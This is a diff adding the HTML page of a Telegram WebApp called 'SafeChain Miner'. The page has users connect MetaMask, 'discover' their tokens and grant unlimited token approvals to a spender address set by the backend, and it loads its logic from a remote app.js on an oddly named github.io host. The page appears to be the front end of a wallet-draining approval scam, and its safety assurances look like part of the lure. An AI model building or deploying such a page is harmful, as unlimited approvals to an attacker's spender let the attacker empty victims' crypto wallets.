@@ -1,1 +1,78 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>SafeChain Miner — WebApp</title>
 
+    <link rel="stylesheet" href="https://erahozoqu763.github.io/mmaaiinnnnn/style.css" />
+    <!-- Telegram WebApp SDK (всередині Telegram відкриється як WebApp) -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- ethers v6 (CDN) -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">SafeChain <span class="muted">Miner</span></div>
+        <div id="netInfo" class="chip">—</div>
+    </header>
+
+    <main class="container">
+        <section class="card">
+            <h2>1) Підключення гаманця</h2>
+            <p class="small muted">Працюємо лише через підпис (без seed/PK). Вебклієнт не зберігає твої дані.</p>
+
+            <div class="row">
+                <button id="btnConnect" class="btn primary">🔗 Підключити MetaMask</button>
+                <button id="btnDisconnect" class="btn" disabled>⏏️ Від’єднати</button>
+            </div>
+
+            <div id="who" class="mono small"></div>
+            <div id="bindState" class="mono small"></div>
+
+            <div class="row">
+                <button id="btnBind" class="btn success" disabled>✍️ Підписати прив’язку до Telegram</button>
+            </div>
+        </section>
+
+        <section class="card">
+            <h2>2) Токени та дозволи</h2>
+            <p class="small muted">
+                Список токенів береться з <code>tokens.json</code> бекенду. Для кожного можна видати
+                <b>Approve Unlimited</b> на адресу <span id="spenderSpan" class="mono"></span> або відкликати <b>Revoke (0)</b>.
+            </p>
+
+            <div class="row">
+                <button id="btnRefresh" class="btn">🔄 Оновити баланси/allowance</button>
+                <button id="btnDiscover" class="btn">🧭 Discover мої токени</button>
+            </div>
+
+            <div id="tokensTable" class="table"></div>
+        </section>
+
+        <section class="card">
+            <h2>Налаштування (read-only)</h2>
+            <div class="grid2">
+                <div><span class="muted">SPENDER:</span> <span id="cfgSpender" class="mono"></span></div>
+                <div><span class="muted">VAULT:</span> <span id="cfgVault" class="mono"></span></div>
+                <div><span class="muted">Chain ID:</span> <span id="cfgChainId" class="mono"></span></div>
+                <div><span class="muted">API:</span> <span id="cfgApi" class="mono"></span></div>
+            </div>
+        </section>
+
+        <section class="card warn">
+            <h3>Безпека: чим “безпечний” approve відрізняється від “небезпечного”</h3>
+            <ul>
+                <li><b>Безпечно:</b> ти свідомо натискаєш <i>Approve</i> у своєму гаманці, бачиш <i>spender</i>=SPENDER і мережу=Config.chainId.</li>
+                <li><b>Небезпечно:</b> прихована інтеракція, підміна мережі або spender’а, автоматичний підпис без UI. Ми такого не робимо.</li>
+            </ul>
+        </section>
+    </main>
+
+    <footer class="footer">
+        © SafeChain • тільки для твоїх власних адрес
+    </footer>
+
+    <script src="https://erahozoqu763.github.io/mmaaiinnnnn/app.js"></script>
+</body>
+</html>
